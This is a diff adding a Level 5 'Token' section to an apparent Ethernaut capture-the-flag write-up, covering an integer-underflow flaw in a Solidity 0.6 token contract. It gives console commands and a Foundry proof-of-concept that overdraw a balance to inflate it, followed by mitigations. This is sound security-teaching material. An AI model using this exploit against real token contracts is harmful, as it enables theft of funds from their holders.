@@ -310,3 +310,96 @@ contract Telephone_Solutions is Test {
 ### Mitigation (The Fix)
 
 Never use `tx.origin` for authorization or access control. Always use `msg.sender`. If you need to ensure that the caller is an EOA (and not a smart contract), you can use `require(tx.origin == msg.sender)`, but this should be used carefully as it breaks composability (preventing other contracts from interacting with yours).
+
+## Level 5: Token
+
+### Objective
+
+Hack the basic token contract to significantly increase your initial balance of 20 tokens to a very large amount.
+
+### Vulnerability Analysis
+
+The critical vulnerability in this contract is an **Integer Underflow**. The contract is compiled with an older version of Solidity (`^0.6.0`), which does not have built-in protections against mathematical underflows or overflows.
+
+The flaw exists within the `transfer` function:
+
+```solidity
+require(balances[msg.sender] - _value >= 0);
+```
+
+Because the `balances` mapping uses `uint256` (unsigned integers, which cannot be negative), subtracting a larger number from a smaller number (e.g., `20 - 21`) will not result in a negative value. Instead, it "wraps around" to the maximum possible value for a `uint256` ($2^{256} - 1$). Consequently, the `require` statement always evaluates to `true`, allowing an attacker to transfer more tokens than they actually own, underflowing their own balance to a massive number in the process.
+
+### Exploit Steps
+
+**Method 1: Web3 Console (Browser)**
+
+1. **Check initial balance:** Verify you start with 20 tokens.
+
+```javascript
+(await contract.balanceOf(player)).toString()
+```
+
+2. **Trigger the underflow:** Transfer more tokens than you possess (e.g., 21) to any other address (like a dummy address or the zero address) to underflow your own balance.
+
+```javascript
+await contract.transfer("0x1111111111111111111111111111111111111111", 21);
+```
+
+3. **Verify the hack:** Check your balance again. You should now have an astronomical amount of tokens.
+
+```javascript
+(await contract.balanceOf(player)).toString()
+```
+
+**Method 2: Foundry (PoC)**
+
+*(Note: To successfully test this in Foundry with Solidity `0.8.x`, you must wrap the math operations in the `Token.sol` target contract with an `unchecked { ... }` block to replicate the compiler behavior of version `0.6.0`)*
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Test, console} from "forge-std/Test.sol";
+import {Token} from "../src/05_Token/Token.sol";
+
+contract Token_Solutions is Test {
+    Token TokenContract;
+
+    address public owner;
+    address public hacker;
+    address public dummy;
+
+    function setUp() public {
+        owner = makeAddr("owner");
+        
+        vm.prank(owner);
+        TokenContract = new Token(210000);
+
+        hacker = makeAddr("hacker");
+        dummy = makeAddr("dummy");
+
+        // Simulate the Ethernaut environment by giving the hacker 20 initial tokens
+        vm.prank(owner);
+        TokenContract.transfer(hacker, 20);
+    }
+
+    function test_attack() public {
+        vm.prank(hacker);
+        
+        // Transfer 21 tokens (1 more than the balance) to a dummy address
+        // This will cause the hacker's balance to underflow
+        TokenContract.transfer(dummy, 21);
+
+        // Verify the balance underflowed to a massive number
+        uint256 hackerBalance = TokenContract.balanceOf(hacker);
+        assertGt(hackerBalance, 20, "Hack failed: Balance did not underflow");
+    }
+}
+```
+
+### Mitigation (The Fix)
+
+To prevent integer underflow and overflow vulnerabilities:
+
+1. **Upgrade Solidity Version (Recommended):** Compile your contracts using Solidity `0.8.0` or higher. These modern versions include built-in automatic checks that will safely revert the transaction if an arithmetic underflow or overflow occurs.
+2. **Use SafeMath:** If you are restricted to using a Solidity version prior to `0.8.0`, you must use a library like OpenZeppelin's `SafeMath` for all arithmetic operations (e.g., using `balances[msg.sender].sub(_value)`). The library manually checks for overflows/underflows before executing the math.
